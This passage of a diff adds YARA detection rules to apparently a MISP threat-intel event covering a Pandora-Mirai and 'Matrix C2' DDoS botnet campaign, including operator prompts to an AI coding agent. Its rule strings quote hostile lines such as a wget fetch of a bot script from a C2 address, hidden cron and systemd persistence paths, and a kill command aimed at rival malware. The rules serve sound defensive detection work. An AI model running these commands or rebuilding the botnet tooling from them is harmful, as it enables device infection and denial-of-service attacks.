\"resolve_cnc_addr\" ascii fullword\n      // .anime operator-bespoke marker (XOR-0x54 decoded)\n      $anime_xor = { 7F 61 59 97 }\n   condition:\n      uint32(0) == 0x464C457F and\n      filesize < 200KB and\n      (\n         ($charset_xor and $sora_xor) or\n         ($charset_xor and $pandoranet) or\n         ($sym_auth and $sym_resolve and $charset_xor) or\n         ($pandoranet and $sym_auth and $sym_resolve) or\n         ($charset_xor and $anime_xor)\n      )\n}",
+        "to_ids": true,
+        "comment": "MAL_ELF_Naku_Pandora_Mirai_Family | TIER: Detection | robustness 3 | confidence HIGH | ATT&CK T1027, T1095, T1498.001 | rule hash 7c98347a | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Detection\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "07f41981-93d4-551c-8b61-9bb39200935d",
+        "type": "yara",
+        "category": "Payload installation",
+        "value": "rule MAL_Bash_Pandora_Dropper_Family {\n   meta:\n      description = \"Detects pandora.sh / Naku.sh dropper class fetching 11-architecture Pandora-Mirai ELF binaries via wget/curl loop. Operator-specific arch-set (arm5/arm6/m68k/mpsl/sh4/spc), Naku./Pandora. binary naming, execution-with-arch-tag pattern, and cleanup sequence identify this dropper family independent of current distribution-host IP.\"\n      license = \"CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/\"\n      author = \"The Hunters Ledger\"\n      reference = \"https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/\"\n      date = \"2026-05-26\"\n      hash1 = \"d3fd9994b16dc9b14c29f7faf7b5f6c84f44b06fccf82f0031a0871ce5e20e17\"\n      family = \"Pandora-Mirai\"\n      malware_type = \"Dropper\"\n      campaign = \"UTA-2026-014\"\n      id = \"46df6422-622f-58e0-92fc-fd4110df274e\"\n   strings:\n      // Architecture set — operator-specific subset with all 11 arches\n      $arch_arm5   = \"arm5\" ascii\n      $arch_arm6   = \"arm6\" ascii\n      $arch_m68k   = \"m68k\" ascii\n      $arch_mpsl   = \"mpsl\" ascii\n      $arch_sh4    = \"sh4\"  ascii\n      $arch_spc    = \"spc\"  ascii\n      // Binary naming conventions\n      $bin_naku    = \"Naku.\" ascii\n      $bin_pandora = \"Pandora.\" ascii\n      // Execution-with-arch-tag pattern (argv-source-tagging) — IP-independent\n      $exec_tag_r  = \"./nig realtek\" ascii\n      $exec_tag_n  = \"pandora_bot PandoraNet\" ascii\n      // Cleanup pattern\n      $cleanup     = \"rm -rf nig\" ascii\n   condition:\n      filesize < 50KB and\n      (\n         (3 of ($arch_*) and ($bin_naku or $bin_pandora)) or\n         ($exec_tag_r and $cleanup) or\n         $exec_tag_n\n      )\n}",
+        "to_ids": true,
+        "comment": "MAL_Bash_Pandora_Dropper_Family | TIER: Detection | robustness 2 | confidence HIGH | ATT&CK T1037.004, T1053.003, T1059.004, T1587.001 | rule hash 3b616119 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Detection\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "9eee3613-d266-5d69-88d5-f5a6c7e72a33",
+        "type": "yara",
+        "category": "Payload installation",
+        "value": "rule MAL_Discord_Bot_DDoSasService_Customer_Interface {\n   meta:\n      description = \"Detects Matrix C2 Discord-bot customer interface JavaScript dispatch table for DDoS-as-a-Service. Identifies the 13-attack-method catalog (udp-star, syn-storm, tcp-matrix, tcp-rst, udp-bypass, icmp-hell, multi-vector, http-flood, mass_infection, frag-storm, dns-rain, ovh-nuke, http-star) combined with VIP/free tier branding, GBPS capability estimates, and AI-Generated Code Signature emoji branding.\"\n      license = \"CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/\"\n      author = \"The Hunters Ledger\"\n      reference = \"https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/\"\n      date = \"2026-05-26\"\n      hash1 = \"81748f0236319c678db39945ec77fffe1b33e84ffa9731b2836b911f8e83a5cc\"\n      family = \"Matrix C2\"\n      malware_type = \"DDoS-as-a-Service Bot Interface\"\n      campaign = \"UTA-2026-014\"\n      id = \"0f9967aa-bd3f-5fba-be62-bf75b119989b\"\n   strings:\n      $m_udpstar  = \"'udp-star'\" ascii\n      $m_synstorm = \"'syn-storm'\" ascii\n      $m_tcpmat   = \"'tcp-matrix'\" ascii\n      $m_tcprst   = \"'tcp-rst'\" ascii\n      $m_bypass   = \"'udp-bypass'\" ascii\n      $m_icmp     = \"'icmp-hell'\" ascii\n      $m_multi    = \"'multi-vector'\" ascii\n      $m_http     = \"'http-flood'\" ascii\n      $m_infect   = \"'mass_infection'\" ascii\n      $m_frag     = \"'frag-storm'\" ascii\n      $m_dns      = \"'dns-rain'\" ascii\n      $m_ovh      = \"'ovh-nuke'\" ascii\n      $m_httpstar = \"'http-star'\" ascii\n      $tier_vip   = \"vip: true\" ascii\n      $tier_free  = \"vip: false\" ascii\n      $gbps_field = \"gbps:\" ascii\n      $emoji_icmp = \"\\xf0\\x9f\\x94\\xa5 ICMP Hell\" ascii\n      $emoji_udp  = \"\\xf0\\x9f\\x9a\\x80 UDP Bypass\" ascii\n   condition:\n      filesize < 500KB and\n      (\n         (4 of ($m_*) and ($tier_vip or $tier_free)) or\n         (3 of ($m_*) and $gbps_field and ($emoji_icmp or $emoji_udp)) or\n         ($m_ovh and $m_frag and $m_infect and $tier_vip)\n      )\n}",
+        "to_ids": true,
+        "comment": "MAL_Discord_Bot_DDoSasService_Customer_Interface | TIER: Detection | robustness 3 | confidence HIGH | ATT&CK T1059.007, T1498.001, T1498.002 | rule hash f7528ec9 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Detection\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "434fac9b-4d10-59d4-97ff-81f7542b3e96",
+        "type": "yara",
+        "category": "Payload installation",
+        "value": "rule MAL_Discord_OperatorID_Snowflake_PandoraNet {\n   meta:\n      description = \"Narrow detection on the literal Discord operator snowflake ID 1441591352927326259 as it appears in operator artifacts (whatineed.txt prompt, Discord bot configs, operator notes). Snowflake decodes to account creation timestamp 2025-11-22T00:49:22 UTC. Also detects PandoraNet botnet ID co-occurrence in operator-exposed files. Pivot/hunting rule, not high-confidence detection.\"\n      license = \"CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/\"\n      author = \"The Hunters Ledger\"\n      reference = \"https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/\"\n      date = \"2026-05-26\"\n      hash1 = \"d888a16cd6aa76f62a329906db4f241e6bc23ff5f21d61e754ade8ccab6da0d0\"\n      family = \"Rovodev Operator Artifacts\"\n      malware_type = \"Operator Identity Artifact\"\n      campaign = \"UTA-2026-014\"\n      id = \"584bfc4c-dccc-5e4e-ad2c-7d0d16e6832c\"\n   strings:\n      $discord_id  = \"1441591352927326259\" ascii\n      $pandoranet  = \"PandoraNet\" ascii fullword\n      $ionos_ip    = \"87.106.143.220\" ascii\n      $backup_ip   = \"87.106.54.213\" ascii\n      $my_user     = \"my user ID is\" ascii nocase\n      $discord_ctx = \"discord\" nocase ascii\n   condition:\n      filesize < 5MB and\n      (\n         ($discord_id and $my_user) or\n         ($discord_id and $pandoranet) or\n         ($discord_id and ($ionos_ip or $backup_ip)) or\n         ($pandoranet and ($ionos_ip or $backup_ip) and $discord_ctx)\n      )\n}",
+        "to_ids": false,
+        "comment": "MAL_Discord_OperatorID_Snowflake_PandoraNet | TIER: Hunting | robustness 1 | confidence HIGH for the artifact itself; the underlying pivot value degrades if the operator rotates the Discord account | ATT&CK T1584.004 | rule hash f8998fd8 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Hunting\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "5c00a68b-d328-55c7-a1f6-d38acd5ec91e",
+        "type": "yara",
+        "category": "Payload installation",
+        "value": "rule MAL_JSON_Rovodev_SessionContext_FileWrite_Authoring {\n   meta:\n      description = \"Detects operator-exposed Atlassian Rovodev AI coding agent session artifacts (session_context.json / rovodev.log) containing file_write tool calls with offensive Python initial_content payloads, gated on a co-occurring Matrix C2 content marker to exclude benign Rovodev sessions.\"\n      license = \"CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/\"\n      author = \"The Hunters Ledger\"\n      reference = \"https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/\"\n      date = \"2026-05-26\"\n      hash1 = \"9eece9f46bc420b53884d4292622621c9960459c1d7a73635420771e7d0aa1fa\"\n      family = \"Rovodev Operator Artifacts\"\n      malware_type = \"AI Coding Agent Session Artifact\"\n      campaign = \"UTA-2026-014\"\n      id = \"826c0fe7-b1fc-5689-9fd7-69e2abc40277\"\n   strings:\n      $session_key = \"session_context\" ascii\n      $tool_call   = \"file_write\" ascii\n      $init_content = \"initial_content\" ascii\n      $rovo_log    = \"rovodev.log\" ascii\n      $py_shebang  = \"#!/usr/bin/env python3\" ascii\n      $mass_infect = \"Launch mass infection campaign\" ascii\n      $c2_header   = \"MATRIX C2\" ascii\n   condition:\n      filesize < 2MB and\n      (\n         ($session_key and $tool_call and $init_content and $py_shebang and ($mass_infect or $c2_header)) or\n         ($tool_call and $mass_infect) or\n         ($rovo_log and $c2_header)\n      )\n}",
+        "to_ids": true,
+        "comment": "MAL_JSON_Rovodev_SessionContext_FileWrite_Authoring | TIER: Detection | robustness 2 | confidence HIGH | ATT&CK T1587.001 | rule hash 0dc34cc7 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Detection\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "c53d7464-2b45-5e33-8c77-b8a8b978e63b",
+        "type": "yara",
+        "category": "Payload installation",
+        "value": "rule MAL_Markdown_Rovodev_WhatINeed_OperatorPrompt {\n   meta:\n      description = \"Detects whatineed.txt-class operator natural-language prompts to AI coding agents specifying offensive capability development. Pattern includes C2 debugging request, GitHub C2-leak repository reference, automatic credential harvesting ('automatic give me login'), Discord integration request, and operator user-ID disclosure. This operator's exact file captured from 87.106.143.220 open-directory.\"\n      license = \"CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/\"\n      author = \"The Hunters Ledger\"\n      reference = \"https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/\"\n      date = \"2026-05-26\"\n      hash1 = \"d888a16cd6aa76f62a329906db4f241e6bc23ff5f21d61e754ade8ccab6da0d0\"\n      family = \"Rovodev Operator Artifacts\"\n      malware_type = \"Operator Prompt (AI-Augmented Offensive Operations)\"\n      campaign = \"UTA-2026-014\"\n      id = \"3e3d1343-158e-5030-b682-3a90eb4966ef\"\n   strings:\n      $c2_debug   = \"c2 doesn't connect\" ascii nocase\n      $c2_leak    = \"C2-Leak\" ascii\n      $auto_login = \"automatic give me login\" ascii nocase\n      $discord_req = \"make discord live\" ascii nocase\n      $discord_id  = \"1441591352927326259\" ascii\n      $cleanup_req = \"clean files not needed\" ascii nocase\n      $stronger    = \"make it stronger\" ascii nocase\n   condition:\n      filesize < 10KB and\n      (\n         ($c2_debug and $c2_leak) or\n         ($auto_login and $discord_req) or\n         ($discord_id and $cleanup_req) or\n         ($c2_debug and $auto_login and $stronger)\n      )\n}",
+        "to_ids": false,
+        "comment": "MAL_Markdown_Rovodev_WhatINeed_OperatorPrompt | TIER: Hunting | robustness 1 | confidence HIGH for this operator's specific artifact; MODERATE for class-level detection | ATT&CK T1587.001, T1059.006 | rule hash 820513cc | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Hunting\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "22fbde36-779f-5457-8383-1ba2315576f7",
+        "type": "yara",
+        "category": "Payload installation",
+        "value": "rule MAL_Python_AIGenerated_OffensiveCode_Universal_Subset {\n   meta:\n      description = \"Cross-operator detection for AI-generated offensive Python code using the 5-criteria universal subset confirmed across 3 independent operators (Russian Gemini, Turkish ARPA, English Rovodev). Detects co-occurrence of verbose docstrings, bare-except handlers, educational variable naming, emoji-in-output bleed, and version-numbered iteration chains. High FP risk in isolation; requires multi-criteria co-occurrence gate — analyst triage, not automated block.\"\n      license = \"CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/\"\n      author = \"The Hunters Ledger\"\n      reference = \"https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/\"\n      date = \"2026-05-26\"\n      hash1 = \"64ca12cae6f5e520abb4158da3bbc14e909c2128748ae0c5806fa4206cc14260\"\n      family = \"AI-Generated Offensive Code\"\n      malware_type = \"Offensive Python (AI-authored)\"\n      campaign = \"ai-agent-frameworks-2026-05-23\"\n      id = \"38aeca8a-3dad-5b61-9787-a14edf92a250\"\n   strings:\n      $bare_except1 = \"except:\" ascii\n      $bare_except2 = \"except Exception:\" ascii\n      $bare_pass    = /except[^\\n]*:\\s*\\n\\s*pass/ ascii\n      $doc_attack   = /def \\w+_attack\\w*\\(.*\\):\\s*\\n\\s+\\\"\\\"\\\"/ ascii\n      $doc_flood    = /def \\w+_flood\\w*\\(.*\\):\\s*\\n\\s+\\\"\\\"\\\"/ ascii\n      $doc_scan     = /def \\w+_scan\\w*\\(.*\\):\\s*\\n\\s+\\\"\\\"\\\"/ ascii\n      $doc_infect   = /def \\w+_infect\\w*\\(.*\\):\\s*\\n\\s+\\\"\\\"\\\"/ ascii\n      $emoji_fire   = \"\\xf0\\x9f\\x94\\xa5\" ascii\n      $emoji_rocket = \"\\xf0\\x9f\\x9a\\x80\" ascii\n      $emoji_check  = \"\\xe2\\x9c\\x85\"     ascii\n      $ver_chain_v2 = \"_v2.\" ascii\n      $ver_chain_v3 = \"_v3.\" ascii\n      $ver_chain_v4 = \"_v4.\" ascii\n      $ctx_ddos  = \"ddos\" nocase ascii\n      $ctx_flood = \"flood\" nocase ascii\n      $ctx_brute = \"brute\" nocase ascii\n      $ctx_infect = \"infect\" nocase ascii\n      $ctx_cnc   = \"cnc\" nocase ascii\n   condition:\n      filesize < 500KB and\n      (uint16(0) == 0x2123 or $bare_except1 or $bare_except2) and\n      (1 of ($ctx_*)) and\n      (\n         ($bare_pass and 1 of ($doc_*)) or\n         (1 of ($emoji_*) and 1 of ($doc_*)) or\n         (2 of ($ver_chain_v2, $ver_chain_v3, $ver_chain_v4) and 1 of ($doc_*))\n      )\n}",
+        "to_ids": false,
+        "comment": "MAL_Python_AIGenerated_OffensiveCode_Universal_Subset | TIER: Hunting | robustness 2 | confidence MODERATE (HIGH for the universal-subset criteria as a class; MODERATE for any individual file match without corroborating context) | ATT&CK T1059.006, T1587.001 | rule hash 9d18ae46 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Hunting\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "8df02696-f110-564a-bd09-3be858c982d4",
+        "type": "yara",
+        "category": "Payload installation",
+        "value": "rule MAL_Python_Matrix_C2_Framework_Family {\n   meta:\n      description = \"Detects Matrix C2 Python DDoS-as-a-Service framework files authored via Atlassian Rovodev AI coding agent. Identifies master_control.py, attack_engine.py, and multi_vector_agent.py via AI-generated banner strings, operator-marketing comments, emoji-branded attack method catalog entries, and mass-infection docstring captured directly from Rovodev session file_write tool call payloads.\"\n      license = \"CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/\"\n      author = \"The Hunters Ledger\"\n      reference = \"https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/\"\n      date = \"2026-05-26\"\n      hash1 = \"e9e0eafc89e4a9db796c63bb4fdc5c0fd1106f8b9c234fb57e51a7934f2b8d8e\"\n      hash2 = \"921e4c1d86813838d40010e82a8f374a70b91f06008db5182d1ec6c2da672c09\"\n      hash3 = \"a19b972688158e361e8646ec17556ec46bf84f0cd24fb8707e4df85cb9d9a6d2\"\n      family = \"Matrix C2\"\n      malware_type = \"DDoS-as-a-Service Framework\"\n      campaign = \"UTA-2026-014\"\n      id = \"d804ea26-cbfc-5194-854c-228ee9cfc434\"\n   strings:\n      $banner     = \"MATRIX C2 - IMPLEMENTATION PLAN\" ascii\n      $docstring  = \"Launch mass infection campaign\" ascii\n      $emoji_icmp = \"\\xf0\\x9f\\x94\\xa5 ICMP Hell\" ascii\n      $emoji_udp  = \"\\xf0\\x9f\\x9a\\x80 UDP Bypass\" ascii\n      $gbps_claim = \"Increased default threads for 50Gbps+\" ascii\n      $final_doc  = \"FINAL_DEPLOYMENT_COMPLETE\" ascii\n      $ultimate   = \"ULTIMATE_DEPLOYMENT\" ascii\n      $llm_close  = \"Let me start Phase 1 now\" ascii\n      $method_udp = \"'udp-star'\" ascii\n      $method_syn = \"'syn-storm'\" ascii\n      $method_ovh = \"'ovh-nuke'\" ascii\n   condition:\n      filesize < 2MB and\n      (\n         ($banner and ($docstring or $llm_close)) or\n         ($gbps_claim and ($emoji_icmp or $emoji_udp)) or\n         ($final_doc and $ultimate) or\n         (2 of ($method_udp, $method_syn, $method_ovh) and ($gbps_claim or $docstring))\n      )\n}",
+        "to_ids": true,
+        "comment": "MAL_Python_Matrix_C2_Framework_Family | TIER: Detection | robustness 3 | confidence HIGH | ATT&CK T1059.006, T1498.001, T1498.002, T1587.001 | rule hash 339ef770 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Detection\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "b3e3c3bb-3007-5e2a-ab6e-1f73a1640aa2",
+        "type": "yara",
+        "category": "Payload installation",
+        "value": "rule MAL_Python_Persistent_Bot_DualChannel_CNC {\n   meta:\n      description = \"Detects persistent_bot.sh-class operator scripts implementing 5-vector Linux persistence and dual-channel CNC architecture. Identifies operator-specific JSON wire format (bot_register + heartbeat messages with bot_type/arch/vendor fields), hidden cron entry /etc/cron.d/.cache_update, and masquerade persistence (sysupdate init.d service + system-update.service systemd unit).\"\n      license = \"CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/\"\n      author = \"The Hunters Ledger\"\n      reference = \"https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/\"\n      date = \"2026-05-26\"\n      hash1 = \"4809a7ee9f5dbcbe86cfbd77a45e2a268a37bcc947e8e1621164df653597948b\"\n      family = \"Matrix C2\"\n      malware_type = \"Persistence Installer (AI-authored)\"\n      campaign = \"UTA-2026-014\"\n      id = \"91f7bf1a-6620-50cf-81c0-ff7faf1328e3\"\n   strings:\n      $wire_reg   = \"\\\"type\\\":\\\"bot_register\\\"\" ascii\n      $wire_arch  = \"\\\"arch\\\":\\\"$arch\\\"\" ascii\n      $wire_vendor = \"\\\"vendor\\\":\\\"$vendor\\\"\" ascii\n      $wire_hb    = \"\\\"type\\\":\\\"heartbeat\\\"\" ascii\n      $cnc_ep     = \"87.106.143.220\" ascii\n      $cnc_port   = \"1337\" ascii\n      $cron_hidden = \"/etc/cron.d/.cache_update\" ascii\n      $initd_mask  = \"/etc/init.d/sysupdate\" ascii\n      $systemd_mask = \"/etc/systemd/system/system-update.service\" ascii\n      $reseed     = \"wget -qO- http://87.106.143.220/bot.sh\" ascii\n      $kill_comp  = \"pkill -9 -f \\\"(mirai|qbot|tsunami|gafgyt|bashlite|kaiten)\\\"\" ascii\n   condition:\n      filesize < 50KB and\n      (\n         ($wire_reg and $cnc_ep) or\n         ($cron_hidden and ($initd_mask or $systemd_mask)) or\n         ($reseed and $kill_comp) or\n         ($wire_hb and $cnc_port and $cron_hidden) or\n         ($wire_arch and $wire_vendor and ($wire_reg or $wire_hb))\n      )\n}",
+        "to_ids": true,
+        "comment": "MAL_Python_Persistent_Bot_DualChannel_CNC | TIER: Detection | robustness 2 | confidence HIGH | ATT&CK T1037.004, T1053.003, T1059.004, T1071.001, T1543.002, T1546.004 | rule hash ea7ed994 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Detection\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "80780b09-de91-5ea7-8a2f-a15ca42c1ec3",
+        "type": "yara",
+        "category": "Payload installation",
+        "value": "rule MAL_Python_StealthAgent_AntiDebug_AntiVM_AI_Authored {\n   meta:\n      description = \"Detects stealth_agent.py-class AI-authored Python backdoors combining anti-debug, anti-VM, sandbox evasion, process hiding, rootkit install, systemd/cron persistence, self-destruct, and polymorphic payload generation with bare-except AI-code signature. Family-generic anti-analysis feature bucket — deploy as a hunting/triage lead, not standalone attribution.\"\n      license = \"CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/\"\n      author = \"The Hunters Ledger\"\n      reference = \"https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/\"\n      date = \"2026-05-26\"\n      hash1 = \"d1086ab3c06764ffd81492b4c723bda83bac19dc101c8542bc566e5888c92da3\"\n      family = \"Matrix C2\"\n      malware_type = \"Stealth Agent (AI-authored backdoor)\"\n      campaign = \"UTA-2026-014\"\n      id = \"d4482d80-a943-5693-86d2-773c22063b33\"\n   strings:\n      $anti_debug = \"anti_debug\" ascii nocase\n      $anti_vm    = \"anti_vm\" ascii nocase\n      $sandbox_chk = \"sandbox\" ascii nocase\n      $rootkit    = \"rootkit\" ascii nocase\n      $self_dest  = \"self_destruct\" ascii nocase\n      $polymorphic = \"polymorphic\" ascii nocase\n      $aes_gcm    = \"AES-256-GCM\" ascii\n      $pbkdf2     = \"PBKDF2\" ascii\n      $handshake  = \"handshake\" ascii nocase\n      $bare_exc   = \"except:\" ascii\n   condition:\n      filesize < 500KB and\n      (\n         (2 of ($anti_debug, $anti_vm, $sandbox_chk) and ($rootkit or $self_dest)) or\n         ($aes_gcm and $pbkdf2 and $handshake) or\n         ($polymorphic and $bare_exc)\n      )\n}",
+        "to_ids": false,
+        "comment": "MAL_Python_StealthAgent_AntiDebug_AntiVM_AI_Authored | TIER: Hunting | robustness 2 | confidence MODERATE | ATT&CK T1014, T1059.006, T1497.001, T1587.001 | rule hash caf3e698 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Hunting\"",
+            "colour": "#4ade80"
+          }
+        ]
+      }
+    ],
+    "Object": []
+  }
+}
